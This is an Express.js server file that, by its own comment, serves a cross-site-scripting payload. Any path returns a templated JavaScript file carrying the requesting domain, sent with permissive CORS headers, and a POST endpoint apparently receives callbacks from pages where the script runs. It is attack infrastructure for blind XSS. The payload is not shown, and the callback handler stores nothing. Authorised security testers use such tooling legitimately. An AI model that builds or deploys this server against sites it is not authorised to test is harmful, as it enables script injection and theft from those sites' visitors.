import express from "express";
import fs from "fs";
import { PrismaClient } from "@prisma/client";

// Create Prisma client instance
const prisma = new PrismaClient();

// Test Prisma connection
try {
    await prisma.$connect();
    console.log("Successfully connected to database");
} catch (error) {
    console.error("Prisma connection error:", error);
}

// Express Server
const server = express();
server.use(express.json());

server.options("/", (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    res.status(200).send();
});
server.post("/", async (req, res) => {
    // Set CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    res.status(200).send();
});

// Serve the XSS payload
server.all("/*", async (req, res) => {

    // Prepare the response
    let result = fs.readFileSync("assets/base.js", "utf-8");
    result = result.replace("{{DOMAIN}}", req.headers['host'] ?? 'example.com');

    // Set CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');

    // File Type
    res.setHeader('Content-Type', 'text/javascript');
    res.status(200).send(result);
})

server.listen(3000, () => {
    console.log("Server running on port 3000");
});